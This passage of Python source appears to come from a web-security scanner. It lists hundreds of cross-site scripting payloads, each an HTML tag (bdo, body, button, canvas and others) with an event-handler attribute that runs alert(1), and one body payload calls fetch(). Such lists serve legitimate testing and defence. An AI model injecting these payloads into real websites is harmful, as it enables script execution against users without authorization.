            XSSPayload("BDO Drag Leave", "<bdo draggable=\"true\" ondragleave=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Drag Start", "<bdo draggable=\"true\" ondragstart=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Activate", "<bdo id=x tabindex=1 onactivate=alert(1)></bdo>", "high"),
            XSSPayload("BDO Before Activate", "<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>", "high"),
            XSSPayload("BDO Before Deactivate", "<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>", "high"),
            XSSPayload("BDO Deactivate", "<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>", "high"),
            XSSPayload("BDO Focus", "<bdo id=x tabindex=1 onfocus=alert(1)></bdo>", "high"),
            XSSPayload("BDO Focus In", "<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>", "high"),
            XSSPayload("BDO Before Copy", "<bdo onbeforecopy=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Before Cut", "<bdo onbeforecut=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Before Paste", "<bdo onbeforepaste=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Blur", "<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>", "high"),
            XSSPayload("BDO Click", "<bdo onclick=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Context Menu", "<bdo oncontextmenu=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Copy", "<bdo oncopy=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Cut", "<bdo oncut=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Double Click", "<bdo ondblclick=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Focus Out", "<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>", "high"),
            XSSPayload("BDO Key Down", "<bdo onkeydown=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Key Press", "<bdo onkeypress=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Key Up", "<bdo onkeyup=\"alert(1)\" contenteditable>test</bdo>", "high"),
            XSSPayload("BDO Mouse Down", "<bdo onmousedown=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Mouse Enter", "<bdo onmouseenter=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Mouse Leave", "<bdo onmouseleave=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Mouse Move", "<bdo onmousemove=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Mouse Out", "<bdo onmouseout=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Mouse Over", "<bdo onmouseover=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Mouse Up", "<bdo onmouseup=\"alert(1)\">test</bdo>", "high"),
            XSSPayload("BDO Paste", "<bdo onpaste=\"alert(1)\" contenteditable>test</bdo>", "high"),
            
            # BGSound XSS Payloads
            XSSPayload("BGSound Drag", "<bgsound draggable=\"true\" ondrag=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Drag End", "<bgsound draggable=\"true\" ondragend=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Drag Enter", "<bgsound draggable=\"true\" ondragenter=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Drag Leave", "<bgsound draggable=\"true\" ondragleave=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Drag Start", "<bgsound draggable=\"true\" ondragstart=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Activate", "<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>", "high"),
            XSSPayload("BGSound Before Activate", "<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>", "high"),
            XSSPayload("BGSound Before Deactivate", "<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>", "high"),
            XSSPayload("BGSound Deactivate", "<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>", "high"),
            XSSPayload("BGSound Focus", "<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>", "high"),
            XSSPayload("BGSound Focus In", "<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>", "high"),
            XSSPayload("BGSound Before Copy", "<bgsound onbeforecopy=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Before Cut", "<bgsound onbeforecut=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Before Paste", "<bgsound onbeforepaste=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Blur", "<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>", "high"),
            XSSPayload("BGSound Click", "<bgsound onclick=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Context Menu", "<bgsound oncontextmenu=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Copy", "<bgsound oncopy=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Cut", "<bgsound oncut=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Double Click", "<bgsound ondblclick=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Focus Out", "<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>", "high"),
            XSSPayload("BGSound Key Down", "<bgsound onkeydown=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Key Press", "<bgsound onkeypress=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Key Up", "<bgsound onkeyup=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Down", "<bgsound onmousedown=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Enter", "<bgsound onmouseenter=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Leave", "<bgsound onmouseleave=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Move", "<bgsound onmousemove=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Out", "<bgsound onmouseout=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Over", "<bgsound onmouseover=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Mouse Up", "<bgsound onmouseup=\"alert(1)\">test</bgsound>", "high"),
            XSSPayload("BGSound Paste", "<bgsound onpaste=\"alert(1)\" contenteditable>test</bgsound>", "high"),
            
            # Big XSS Payloads
            XSSPayload("Big Drag", "<big draggable=\"true\" ondrag=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Drag End", "<big draggable=\"true\" ondragend=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Drag Enter", "<big draggable=\"true\" ondragenter=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Drag Leave", "<big draggable=\"true\" ondragleave=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Drag Start", "<big draggable=\"true\" ondragstart=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Activate", "<big id=x tabindex=1 onactivate=alert(1)></big>", "high"),
            XSSPayload("Big Before Activate", "<big id=x tabindex=1 onbeforeactivate=alert(1)></big>", "high"),
            XSSPayload("Big Before Deactivate", "<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>", "high"),
            XSSPayload("Big Deactivate", "<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>", "high"),
            XSSPayload("Big Focus", "<big id=x tabindex=1 onfocus=alert(1)></big>", "high"),
            XSSPayload("Big Focus In", "<big id=x tabindex=1 onfocusin=alert(1)></big>", "high"),
            XSSPayload("Big Before Copy", "<big onbeforecopy=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Before Cut", "<big onbeforecut=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Before Paste", "<big onbeforepaste=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Blur", "<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>", "high"),
            XSSPayload("Big Click", "<big onclick=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Context Menu", "<big oncontextmenu=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Copy", "<big oncopy=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Cut", "<big oncut=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Double Click", "<big ondblclick=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Focus Out", "<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>", "high"),
            XSSPayload("Big Key Down", "<big onkeydown=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Key Press", "<big onkeypress=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Key Up", "<big onkeyup=\"alert(1)\" contenteditable>test</big>", "high"),
            XSSPayload("Big Mouse Down", "<big onmousedown=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Mouse Enter", "<big onmouseenter=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Mouse Leave", "<big onmouseleave=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Mouse Move", "<big onmousemove=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Mouse Out", "<big onmouseout=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Mouse Over", "<big onmouseover=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Mouse Up", "<big onmouseup=\"alert(1)\">test</big>", "high"),
            XSSPayload("Big Paste", "<big onpaste=\"alert(1)\" contenteditable>test</big>", "high"),
            
            # Blink XSS Payloads
            XSSPayload("Blink Drag", "<blink draggable=\"true\" ondrag=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Drag End", "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Drag Enter", "<blink draggable=\"true\" ondragenter=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Drag Leave", "<blink draggable=\"true\" ondragleave=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Drag Start", "<blink draggable=\"true\" ondragstart=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Activate", "<blink id=x tabindex=1 onactivate=alert(1)></blink>", "high"),
            XSSPayload("Blink Before Activate", "<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>", "high"),
            XSSPayload("Blink Before Deactivate", "<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>", "high"),
            XSSPayload("Blink Deactivate", "<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>", "high"),
            XSSPayload("Blink Focus", "<blink id=x tabindex=1 onfocus=alert(1)></blink>", "high"),
            XSSPayload("Blink Focus In", "<blink id=x tabindex=1 onfocusin=alert(1)></blink>", "high"),
            XSSPayload("Blink Before Copy", "<blink onbeforecopy=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Before Cut", "<blink onbeforecut=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Before Paste", "<blink onbeforepaste=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Blur", "<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>", "high"),
            XSSPayload("Blink Click", "<blink onclick=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Context Menu", "<blink oncontextmenu=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Copy", "<blink oncopy=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Cut", "<blink oncut=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Double Click", "<blink ondblclick=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Focus Out", "<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>", "high"),
            XSSPayload("Blink Key Down", "<blink onkeydown=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Key Press", "<blink onkeypress=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Key Up", "<blink onkeyup=\"alert(1)\" contenteditable>test</blink>", "high"),
            XSSPayload("Blink Mouse Down", "<blink onmousedown=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Mouse Enter", "<blink onmouseenter=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Mouse Leave", "<blink onmouseleave=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Mouse Move", "<blink onmousemove=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Mouse Out", "<blink onmouseout=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Mouse Over", "<blink onmouseover=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Mouse Up", "<blink onmouseup=\"alert(1)\">test</blink>", "high"),
            XSSPayload("Blink Paste", "<blink onpaste=\"alert(1)\" contenteditable>test</blink>", "high"),
            
            # Blockquote XSS Payloads
            XSSPayload("Blockquote Drag", "<blockquote draggable=\"true\" ondrag=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Drag End", "<blockquote draggable=\"true\" ondragend=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Drag Enter", "<blockquote draggable=\"true\" ondragenter=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Drag Leave", "<blockquote draggable=\"true\" ondragleave=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Drag Start", "<blockquote draggable=\"true\" ondragstart=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Activate", "<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>", "high"),
            XSSPayload("Blockquote Before Activate", "<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>", "high"),
            XSSPayload("Blockquote Before Deactivate", "<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>", "high"),
            XSSPayload("Blockquote Deactivate", "<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>", "high"),
            XSSPayload("Blockquote Focus", "<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>", "high"),
            XSSPayload("Blockquote Focus In", "<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>", "high"),
            XSSPayload("Blockquote Before Copy", "<blockquote onbeforecopy=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Before Cut", "<blockquote onbeforecut=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Before Paste", "<blockquote onbeforepaste=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Blur", "<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>", "high"),
            XSSPayload("Blockquote Click", "<blockquote onclick=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Context Menu", "<blockquote oncontextmenu=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Copy", "<blockquote oncopy=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Cut", "<blockquote oncut=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Double Click", "<blockquote ondblclick=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Focus Out", "<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>", "high"),
            XSSPayload("Blockquote Key Down", "<blockquote onkeydown=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Key Press", "<blockquote onkeypress=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Key Up", "<blockquote onkeyup=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Down", "<blockquote onmousedown=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Enter", "<blockquote onmouseenter=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Leave", "<blockquote onmouseleave=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Move", "<blockquote onmousemove=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Out", "<blockquote onmouseout=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Over", "<blockquote onmouseover=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Mouse Up", "<blockquote onmouseup=\"alert(1)\">test</blockquote>", "high"),
            XSSPayload("Blockquote Paste", "<blockquote onpaste=\"alert(1)\" contenteditable>test</blockquote>", "high"),
            
            # Body XSS Payloads
            XSSPayload("Body Drag", "<body draggable=\"true\" ondrag=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Drag End", "<body draggable=\"true\" ondragend=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Drag Enter", "<body draggable=\"true\" ondragenter=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Drag Leave", "<body draggable=\"true\" ondragleave=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Drag Start", "<body draggable=\"true\" ondragstart=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Activate", "<body id=x tabindex=1 onactivate=alert(1)></body>", "high"),
            XSSPayload("Body Before Activate", "<body id=x tabindex=1 onbeforeactivate=alert(1)></body>", "high"),
            XSSPayload("Body Before Deactivate", "<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>", "high"),
            XSSPayload("Body Deactivate", "<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>", "high"),
            XSSPayload("Body Focus", "<body id=x tabindex=1 onfocus=alert(1)></body>", "high"),
            XSSPayload("Body Focus In", "<body id=x tabindex=1 onfocusin=alert(1)></body>", "high"),
            XSSPayload("Body After Print", "<body onafterprint=alert(1)>", "high"),
            XSSPayload("Body Before Copy", "<body onbeforecopy=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Before Cut", "<body onbeforecut=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Before Paste", "<body onbeforepaste=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Before Print", "<body onbeforeprint=alert(1)>", "high"),
            XSSPayload("Body Before Unload", "<body onbeforeunload=\"location='javascript:alert(1)'\">", "high"),
            XSSPayload("Body Blur", "<body onblur=alert(1) id=x><iframe id=x>", "high"),
            XSSPayload("Body Click", "<body onclick=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Context Menu", "<body oncontextmenu=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Copy", "<body oncopy=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Cut", "<body oncut=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Double Click", "<body ondblclick=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Error", "<body onerror=alert(1) onload=/>", "high"),
            XSSPayload("Body Focus Out", "<body onfocusout=alert(1) id=x><iframe id=x>", "high"),
            XSSPayload("Body Hash Change", "<body onhashchange=\"alert(1)\">", "high"),
            XSSPayload("Body Key Down", "<body onkeydown=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Key Press", "<body onkeypress=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Key Up", "<body onkeyup=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Load", "<body onload=alert(1)>", "high"),
            XSSPayload("Body Message", "<body onmessage=alert(1)>", "high"),
            XSSPayload("Body Mouse Down", "<body onmousedown=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Mouse Enter", "<body onmouseenter=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Mouse Leave", "<body onmouseleave=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Mouse Move", "<body onmousemove=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Mouse Out", "<body onmouseout=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Mouse Over", "<body onmouseover=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Mouse Up", "<body onmouseup=\"alert(1)\">test</body>", "high"),
            XSSPayload("Body Page Show", "<body onpageshow=alert(1)>", "high"),
            XSSPayload("Body Paste", "<body onpaste=\"alert(1)\" contenteditable>test</body>", "high"),
            XSSPayload("Body Pop State", "<body onpopstate=alert(1)>", "high"),
            XSSPayload("Body Resize", "<body onresize=\"alert(1)\">", "high"),
            XSSPayload("Body Scroll", "<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>", "high"),
            XSSPayload("Body Unhandled Rejection", "<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>", "high"),
            XSSPayload("Body Wheel", "<body onwheel=alert(1)>", "high"),
            
            # BR XSS Payloads
            XSSPayload("BR Drag", "<br draggable=\"true\" ondrag=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Drag End", "<br draggable=\"true\" ondragend=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Drag Enter", "<br draggable=\"true\" ondragenter=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Drag Leave", "<br draggable=\"true\" ondragleave=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Drag Start", "<br draggable=\"true\" ondragstart=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Activate", "<br id=x tabindex=1 onactivate=alert(1)></br>", "high"),
            XSSPayload("BR Before Activate", "<br id=x tabindex=1 onbeforeactivate=alert(1)></br>", "high"),
            XSSPayload("BR Before Deactivate", "<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>", "high"),
            XSSPayload("BR Deactivate", "<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>", "high"),
            XSSPayload("BR Focus", "<br id=x tabindex=1 onfocus=alert(1)></br>", "high"),
            XSSPayload("BR Focus In", "<br id=x tabindex=1 onfocusin=alert(1)></br>", "high"),
            XSSPayload("BR Before Copy", "<br onbeforecopy=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Before Cut", "<br onbeforecut=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Before Paste", "<br onbeforepaste=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Blur", "<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>", "high"),
            XSSPayload("BR Click", "<br onclick=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Context Menu", "<br oncontextmenu=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Copy", "<br oncopy=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Cut", "<br oncut=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Double Click", "<br ondblclick=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Focus Out", "<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>", "high"),
            XSSPayload("BR Key Down", "<br onkeydown=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Key Press", "<br onkeypress=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Key Up", "<br onkeyup=\"alert(1)\" contenteditable>test</br>", "high"),
            XSSPayload("BR Mouse Down", "<br onmousedown=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Mouse Enter", "<br onmouseenter=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Mouse Leave", "<br onmouseleave=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Mouse Move", "<br onmousemove=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Mouse Out", "<br onmouseout=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Mouse Over", "<br onmouseover=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Mouse Up", "<br onmouseup=\"alert(1)\">test</br>", "high"),
            XSSPayload("BR Paste", "<br onpaste=\"alert(1)\" contenteditable>test</br>", "high"),
            
            # Button XSS Payloads
            XSSPayload("Button Autofocus Focus", "<button autofocus onfocus=alert(1)>test</button>", "high"),
            XSSPayload("Button Autofocus Focus In", "<button autofocus onfocusin=alert(1)>test</button>", "high"),
            XSSPayload("Button Drag", "<button draggable=\"true\" ondrag=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Drag End", "<button draggable=\"true\" ondragend=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Drag Enter", "<button draggable=\"true\" ondragenter=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Drag Leave", "<button draggable=\"true\" ondragleave=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Drag Start", "<button draggable=\"true\" ondragstart=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Activate", "<button id=x tabindex=1 onactivate=alert(1)></button>", "high"),
            XSSPayload("Button Before Activate", "<button id=x tabindex=1 onbeforeactivate=alert(1)></button>", "high"),
            XSSPayload("Button Before Deactivate", "<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>", "high"),
            XSSPayload("Button Deactivate", "<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>", "high"),
            XSSPayload("Button Before Copy", "<button onbeforecopy=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Before Cut", "<button onbeforecut=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Before Paste", "<button onbeforepaste=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Blur", "<button onblur=alert(1) id=x></button><input autofocus>", "high"),
            XSSPayload("Button Click", "<button onclick=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Context Menu", "<button oncontextmenu=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Copy", "<button oncopy=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Cut", "<button oncut=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Double Click", "<button ondblclick=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Focus Out", "<button onfocusout=alert(1) id=x></button><input autofocus>", "high"),
            XSSPayload("Button Key Down", "<button onkeydown=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Key Press", "<button onkeypress=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Key Up", "<button onkeyup=\"alert(1)\" contenteditable>test</button>", "high"),
            XSSPayload("Button Mouse Down", "<button onmousedown=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Mouse Enter", "<button onmouseenter=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Mouse Leave", "<button onmouseleave=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Mouse Move", "<button onmousemove=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Mouse Out", "<button onmouseout=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Mouse Over", "<button onmouseover=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Mouse Up", "<button onmouseup=\"alert(1)\">test</button>", "high"),
            XSSPayload("Button Paste", "<button onpaste=\"alert(1)\" contenteditable>test</button>", "high"),
            
            # Canvas XSS Payloads
            XSSPayload("Canvas Drag", "<canvas draggable=\"true\" ondrag=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Drag End", "<canvas draggable=\"true\" ondragend=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Drag Enter", "<canvas draggable=\"true\" ondragenter=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Drag Leave", "<canvas draggable=\"true\" ondragleave=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Drag Start", "<canvas draggable=\"true\" ondragstart=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Activate", "<canvas id=x tabindex=1 onactivate=alert(1)></canvas>", "high"),
            XSSPayload("Canvas Before Activate", "<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>", "high"),
            XSSPayload("Canvas Before Deactivate", "<canvas id=x tabindex=1 onbeforedeactivate=alert(1)></canvas><input autofocus>", "high"),
            XSSPayload("Canvas Deactivate", "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>", "high"),
            XSSPayload("Canvas Focus", "<canvas id=x tabindex=1 onfocus=alert(1)></canvas>", "high"),
            XSSPayload("Canvas Focus In", "<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>", "high"),
            XSSPayload("Canvas Before Copy", "<canvas onbeforecopy=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Before Cut", "<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Before Paste", "<canvas onbeforepaste=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Blur", "<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>", "high"),
            XSSPayload("Canvas Click", "<canvas onclick=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Context Menu", "<canvas oncontextmenu=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Copy", "<canvas oncopy=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Cut", "<canvas oncut=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Double Click", "<canvas ondblclick=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Focus Out", "<canvas onfocusout=alert(1) tabindex=1 id=x></canvas><input autofocus>", "high"),
